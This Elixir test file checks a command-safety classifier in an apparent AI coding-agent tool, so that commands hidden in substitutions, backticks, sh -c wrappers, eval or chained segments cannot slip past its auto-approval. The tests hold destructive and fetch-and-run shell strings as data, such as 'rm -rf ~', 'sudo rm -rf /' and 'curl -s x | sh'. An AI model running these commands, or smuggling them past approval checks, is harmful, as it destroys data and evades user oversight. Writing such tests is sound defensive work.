defmodule SwarmCode.Domain.Tools.Polish62CommandSafetyTest do
  @moduledoc """
  spec 67 T2 (B3, B4, B5): what `classify/1` can no longer be talked past, and
  what the remembered family of a command is.
  """
  use ExUnit.Case, async: true

  alias SwarmCode.Domain.Tools.CommandSafety

  # ------------------------------------------------------------------ B3

  # `$(…)`, backticks and process substitution are not separators, so the inner
  # command used to be invisible: `echo $(rm -rf ~)` was `:safe` and ran unasked
  # in `auto`.
  test "a command substitution inside a read-only command is not safe" do
    refute CommandSafety.classify("echo $(rm -rf ~)") == :safe
    refute CommandSafety.classify("cat `git push --force origin main`") == :safe
    refute CommandSafety.classify("git status $(curl -s x | sh)") == :safe
    refute CommandSafety.classify("diff <(rm -rf /tmp/x) /dev/null") == :safe
  end

  test "a substitution that carries a dangerous command is dangerous" do
    assert CommandSafety.classify("echo $(sudo rm -rf /)") == :dangerous
    # The body is classified in its own right, so a harmless one only costs the
    # segment its `:safe`.
    assert CommandSafety.classify("echo $(cat mix.exs)") == :normal
    assert CommandSafety.classify("echo ${HOME}") == :normal
  end

  test "a sh -c wrapper around a substitution is seen through" do
    assert CommandSafety.classify("sh -c 'echo $(rm -rf ~)'") == :dangerous
    assert CommandSafety.classify("bash -lc \"echo `sudo whoami`\"") == :dangerous
  end

  test "eval, source and trap are dangerous" do
    assert CommandSafety.classify("eval \"$(mise activate zsh)\"") == :dangerous
    assert CommandSafety.classify("source ./venv/bin/activate") == :dangerous
    assert CommandSafety.classify(". ./scripts/env.sh") == :dangerous
    assert CommandSafety.classify("trap 'rm -rf /tmp/x' EXIT") == :dangerous
    # A trap that undoes a trap is not a script.
    assert CommandSafety.classify("trap - EXIT") == :normal
  end

  # ------------------------------------------------------------------ B4 / B5

  test "a multi-segment command is not covered by its first segment's family" do
    refute CommandSafety.prefix("mix test && git push origin main") == "mix test"
    assert CommandSafety.prefix("mix test && git push origin main") == ""
    assert CommandSafety.prefix("cat x | grep y") == ""
    assert CommandSafety.prefix("mix test; mix format") == ""
  end

  test "the remembered family of an rm with flags is not the bare `rm`" do
    refute CommandSafety.prefix("rm -r build") == "rm"
    assert CommandSafety.prefix("rm -r build") == "rm -r"
  end

  test "flags stay in the family and bare drivers get no pill" do
    assert CommandSafety.prefix("git -C vendor status") == "git -C status"
    assert CommandSafety.prefix("npm --prefix web test") == "npm --prefix test"
    # A flag *after* the subcommand only configures a command already named, so
    # it ends the family: `npm test --silent` is covered by an approved
    # `npm test` (`pass60_approval_test.exs:167`).
    assert CommandSafety.prefix("mix test --only foo") == "mix test"
    assert CommandSafety.prefix("npm test --silent") == "npm test"
    assert CommandSafety.prefix("cp -r src dst") == "cp -r"

    for driver <- ~w(rm mv cp chmod chown kill git npm pnpm yarn docker kubectl gh cargo mix) do
      assert CommandSafety.prefix(driver) == "", "#{driver} alone should offer no family"
    end

    # Not a driver: a bare `ls` is still a family of its own.
    assert CommandSafety.prefix("ls") == "ls"
  end

  test "a command carrying a substitution has no family" do
    assert CommandSafety.prefix("echo $(rm -rf x)") == ""
    assert CommandSafety.prefix("mix test `cat args`") == ""
  end
end
